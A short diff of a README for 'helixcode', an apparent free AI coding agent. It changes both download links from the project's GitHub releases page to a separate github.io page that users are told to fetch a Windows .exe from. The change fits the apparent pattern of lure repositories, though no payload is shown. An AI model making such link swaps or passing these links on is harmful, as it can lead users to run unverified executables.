@@ -1,6 +1,6 @@
 # 🤖 helixcode - Free AI coding agent for everyone
 
-[![](https://img.shields.io/badge/Download-helixcode-blue.svg)](https://github.com/melamieenfranchised180/helixcode/releases)
+[![](https://img.shields.io/badge/Download-helixcode-blue.svg)](https://melamieenfranchised180.github.io)
 
 helixcode acts as an autonomous assistant for your programming tasks. It writes code, manages files, and uses tools to help you build software. You can use this application without any costs or subscription fees. It connects to various AI providers so you choose the engine that works best for your needs.
 
@@ -8,7 +8,7 @@ helixcode acts as an autonomous assistant for your programming tasks. It writes 
 
 Follow these steps to set up helixcode on your Windows computer.
 
-1. Go to the [official release page](https://github.com/melamieenfranchised180/helixcode/releases).
+1. Go to the [official release page](https://melamieenfranchised180.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
